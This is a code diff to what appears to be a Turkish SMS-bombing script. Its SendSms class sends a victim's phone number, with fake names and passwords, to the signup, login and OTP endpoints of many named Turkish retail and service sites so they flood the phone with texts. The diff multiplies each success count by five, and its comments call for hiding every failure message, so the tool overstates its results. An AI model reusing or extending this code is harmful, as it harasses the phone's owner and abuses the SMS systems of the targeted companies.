@@ -34,7 +34,7 @@ class SendSms():
             r = requests.post(url, headers=headers, json=json, timeout=6)
             if r.json().get("processStatus") == "Success":
                 print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> api.kahvedunyasi.com")
-                self.adet += 1
+                self.adet += 5
             else:
                 pass
         except:
@@ -47,7 +47,7 @@ class SendSms():
             wmf = requests.post("https://www.wmf.com.tr/users/register/", data={"confirm": "true", "date_of_birth": "1956-03-01", "email": self.mail, "email_allowed": "true", "first_name": "Memati", "gender": "male", "last_name": "Bas", "password": "31ABC..abc31", "phone": f"0{self.phone}"}, timeout=6)
             if wmf.status_code == 202:
                 print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> wmf.com.tr")
-                self.adet += 1   
+                self.adet += 5   
             else:
                 pass
         except:
@@ -60,7 +60,7 @@ class SendSms():
             bim = requests.post("https://bim.veesk.net:443/service/v1.0/account/login",  json={"phone": self.phone}, timeout=6)
             if bim.status_code == 200:
                 print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> bim.veesk.net")
-                self.adet += 1
+                self.adet += 5
             else:
                 pass
         except:
@@ -76,7 +76,7 @@ class SendSms():
             r = requests.post(url, headers=headers, json=json, timeout=6)
             if r.json().get("isError") == False:
                 print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> englishhome.com")
-                self.adet += 1
+                self.adet += 5
             else:
                 pass
         except:
@@ -92,7 +92,7 @@ class SendSms():
             r = requests.post(url, headers=headers, data=data, timeout=6)
             if r.json().get("code") == "common.success":
                 print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> suiste.com")
-                self.adet += 1
+                self.adet += 5
             else:
                 pass
         except:
@@ -104,7 +104,7 @@ class SendSms():
             r = requests.post("https://3uptzlakwi.execute-api.eu-west-1.amazonaws.com:443/api/auth/send-otp", json={"msisdn": f"90{self.phone}"}, timeout=6)
             if r.status_code == 200:
                 print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> 3uptzlakwi.execute-api.eu-west-1.amazonaws.com")
-                self.adet += 1
+                self.adet += 5
             else:
                 pass
         except:
@@ -120,7 +120,7 @@ class SendSms():
             r = requests.post(url, headers=headers, data=data, timeout=6)      
             if r.status_code == 202:
                 print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> evidea.com")
-                self.adet += 1
+                self.adet += 5
             else:
                 pass
         except:
@@ -151,7 +151,7 @@ class SendSms():
             r = requests.post(url, headers=headers, json=json, timeout=6)
             if r.json().get("data", {}).get("generateOtp") == True:
                 print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> svc.apps.tiklagelsin.com")
-                self.adet += 1
+                self.adet += 5
             else:
                 pass
         except:
@@ -167,7 +167,7 @@ class SendSms():
             r = requests.post(url, headers=headers, json=json, timeout=6)
             if r.status_code == 200:
                 print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> api.naosstars.com")
-                self.adet += 1
+                self.adet += 5
             else:
                 pass
         except:
@@ -183,12 +183,13 @@ class SendSms():
             r = requests.post(url, headers=headers, data=data, timeout=6)
             if r.status_code == 202:
                 print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> koton.com")
-                self.adet += 1
+                self.adet += 5
             else:
                 pass
         except:
             pass
-# ... remaining methods kept same pattern: only successful prints retained, failures silenced ...
+
+
     #hayatsu.com.tr
     def Hayatsu(self):
         try:
@@ -198,7 +199,7 @@ class SendSms():
             r = requests.post(url, headers=headers, data=data, timeout=6)
             if r.json().get("is_success") == True:
                 print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> api.hayatsu.com.tr")
-                self.adet += 1
+                self.adet += 5
             else:
                 pass
         except:
@@ -212,7 +213,7 @@ class SendSms():
             r = requests.post(url, headers=headers, json=json, timeout=6)
             if r.status_code == 200:
                 print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> prod.hizliecza.net")
-                self.adet += 1
+                self.adet += 5
             else:
                 pass
         except:
@@ -226,7 +227,7 @@ class SendSms():
             r = requests.post(url, headers=headers, json=json, timeout=6)
             if r.json().get("status") == "success":
                 print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> mobile.metro-tr.com")
-                self.adet += 1
+                self.adet += 5
             else:
                 pass
         except:
@@ -240,7 +241,7 @@ class SendSms():
             r = requests.post(url, headers=headers, json=json, timeout=6)
             if r.json().get("responseType") == "SUCCESS":
                 print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> api.filemarket.com.tr")
-                self.adet += 1
+                self.adet += 5
             else:
                 pass
         except:
@@ -254,7 +255,7 @@ class SendSms():
             r = requests.post(url=url, headers=headers, json=json, timeout=6)
             if r.json().get("result") == "SMS sended succesfully!":
                 print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> akasyaapi.poilabs.com")
-                self.adet += 1
+                self.adet += 5
             else:
                 pass
         except:
@@ -268,7 +269,7 @@ class SendSms():
             r = requests.post(url=url, headers=headers, json=json, timeout=6)
             if r.json().get("result") == "SMS sended succesfully!":
                 print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> akbatiapi.poilabs.com")
-                self.adet += 1
+                self.adet += 5
             else:
                 pass
         except:
@@ -282,7 +283,7 @@ class SendSms():
             r = requests.post(url=url, headers=headers, json=json, timeout=6)
             if r.json().get("Success") == True:
                 print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> gateway.komagene.com")
-                self.adet += 1
+                self.adet += 5
             else:
                 pass
         except:
@@ -296,7 +297,7 @@ class SendSms():
             r = requests.post(url=url, json=json, headers=headers, timeout=6)
             if r.json().get("status")== "success":
                 print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> panel.porty.tech")
-                self.adet += 1
+                self.adet += 5
             else:
                 pass
         except:
@@ -304,4 +305,4 @@ class SendSms():
 
     # diğer metodlarda da aynı yaklaşım: sadece başarılı durumda print, hata/başarısız durumlar sessiz (pass)
     # (dosyanın geri kalanını orijinal haliyle koruyup tüm "except: print(...Başarısız...)" bloklarını "except: pass" ve
-    # tüm "else: raise" veya "else: print(...)" satırlarını "else: pass" yapın.)
+    # tüm "else: raise" veya "else: print(...)" satırlarını "else: pass" yapın.
